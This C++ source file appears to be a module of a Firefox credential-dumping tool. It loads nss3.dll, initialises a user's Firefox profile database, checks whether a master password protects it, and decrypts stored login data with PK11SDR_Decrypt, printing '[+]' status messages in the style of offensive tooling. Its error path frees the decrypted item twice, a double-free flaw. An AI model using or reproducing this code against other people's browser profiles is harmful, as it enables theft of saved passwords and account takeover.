#include "nss.hxx"
#include "crypt.hxx"

//https://firefox-source-docs.mozilla.org/security/nss/legacy/nss_tech_notes/nss_tech_note5/index.html

/*
#define DYNAMIC_FUNCTIONS \
    X(NSS_Initialize) X(NSS_Shutdown) X(PK11_GetInternalKeySlot) X(PK11_FreeSlot) \
    X(PK11_NeedLogin) X(PK11_CheckUserPassword) X(PK11SDR_Decrypt) X(SECITEM_ZfreeItem)

#define X(f) \
    f##_t f = (f##_t)GetProcAddress(nss_library, #f); \
    if (f == NULL) { \
        std::cerr << "Error loading " << #f << std::endl; \
        return 1; \
    }

DYNAMIC_FUNCTIONS

#undef X
*/

int NSS::Load_NSS(std::filesystem::path nss_path)
{
    // setting path is necessary to load the dll
    SetCurrentDirectoryA(nss_path.string().c_str());

    // add "nss3.dll" for full file path
    std::string nss_location = (nss_path / "nss3.dll").string();

    // load dll
    nss_library = LoadLibraryA(nss_location.c_str());
    if (!nss_library) {
        std::cerr << "Failed to load nss3.dll" << std::endl;
        return 1;
    }

    NSS_Initialize = (NSS_Initialize_t)GetProcAddress(nss_library, "NSS_Init");
    if (NSS_Initialize == NULL) {
        std::cerr << "Error getting NSS_Init\n";
        return 1;
    }
    NSS_Shutdown = (NSS_Shutdown_t)GetProcAddress(nss_library, "NSS_Shutdown");
    if (NSS_Shutdown == NULL) {
        std::cerr << "Error getting NSS_Shutdown\n";
        return 1;
    }
    PK11_GetInternalKeySlot = (PK11_GetInternalKeySlot_t)GetProcAddress(nss_library, "PK11_GetInternalKeySlot");
    if (PK11_GetInternalKeySlot == NULL) {
        std::cerr << "Error getting PK11_GetInternalKeySlot\n";
        return 1;
    }
    PK11_FreeSlot = (PK11_FreeSlot_t)GetProcAddress(nss_library, "PK11_FreeSlot");
    if (PK11_FreeSlot == NULL) {
        std::cerr << "Error getting PK11_FreeSlot\n";
        return 1;
    }
    PK11_NeedLogin = (PK11_NeedLogin_t)GetProcAddress(nss_library, "PK11_NeedLogin");
    if (PK11_NeedLogin == NULL) {
        std::cerr << "Error getting PK11_NeedLogin\n";
        return 1;
    }
    PK11_CheckUserPassword = (PK11_CheckUserPassword_t)GetProcAddress(nss_library, "PK11_CheckUserPassword");
    if (PK11_CheckUserPassword == NULL) {
        std::cerr << "Error getting PK11_CheckUserPassword\n";
        return 1;
    }
    PK11SDR_Decrypt = (PK11SDR_Decrypt_t)GetProcAddress(nss_library, "PK11SDR_Decrypt");
    if (PK11SDR_Decrypt == NULL) {
        std::cerr << "Error getting PK11SDR_Decrypt\n";
        return 1;
    }
    SECITEM_ZfreeItem = (SECITEM_ZfreeItem_t)GetProcAddress(nss_library, "SECITEM_ZfreeItem");
    if (SECITEM_ZfreeItem == NULL) {
        std::cerr << "Error getting SECITEM_ZfreeItem\n";
        return 1;
    }
    std::cout << "\n[+] Successfully loaded NSS functions\n\n";
    return 0;
}

void NSS::NSS_KILL()
{
    NSS_Shutdown();
    FreeLibrary(nss_library);
}

int NSS::Initialize_Profile(std::filesystem::path profile_path)
{
    // NSS_Init takes in the profile path and looks for cert9.db
    // the profile is the same name as the profile folder; AppData/Roaming/Mozilla/Firefox/Profiles/[here]
    
    std::string full_profile_path = "sql:";
    full_profile_path.append(profile_path.string());
    std::cout << "Initializing Profile '" << full_profile_path << "'...\n";

    int status = NSS_Initialize(full_profile_path.c_str());
    if (status != 0) {
        std::cerr << "[-] NSS_Init Failed\n\n";
        return 1;
    }
    std::cout << "[+] NSS_Init Successful\n\n";
    return 0;
}

int NSS::Check_Authentication()
{
    std::cout << "Checking Authentication...\n";
    PK11SlotInfo* keyslot = PK11_GetInternalKeySlot();
    if (!keyslot) {
        std::cout << "Couldn't get keyslot... Exiting\n";
        return 1;
    }

    try {
        if(PK11_NeedLogin(keyslot)) {
            std::cout << "[-] Need master password\n\n";
            PK11_FreeSlot(keyslot);
            return 1;
        } else {
            std::cout << "[+] No master password needed\n\n";
        }
    } 
    catch (const std::exception& e) {
        std::cerr << "Something fucked up with PK11_NeedLogin()\nError: " << e.what() << "\n";
        PK11_FreeSlot(keyslot);
        return 0;
    }
    return 0;
}

std::string NSS::Decrypt(std::string data64)
{
    std::vector<uint8_t> data = base64_decode(&data64[0]);
    std::string decrypted_ret;
    SECItem inp, out;

    inp.data = data.data();
    inp.len = data.size();
    out.type = 0;
    out.data = NULL;
    out.len = 0;

    int err_status = PK11SDR_Decrypt(&inp, &out, NULL);
    //std::cout << "Decryption of data returned " << err_status << "\n";
    if (err_status) {  // -1 means password failed, other status are unknown
        std::cerr << "Password decryption failed. There might be a master password\n";
    }
    try {
        std::string decrypted_data((char*)out.data, out.len);
        decrypted_ret = decrypted_data;
    }
    catch(const std::exception& e) {
        std::cerr << e.what() << '\n';
        SECITEM_ZfreeItem(&out, 0); // Avoid leaking SECItem
    }
    SECITEM_ZfreeItem(&out, 0);
    return decrypted_ret;
}

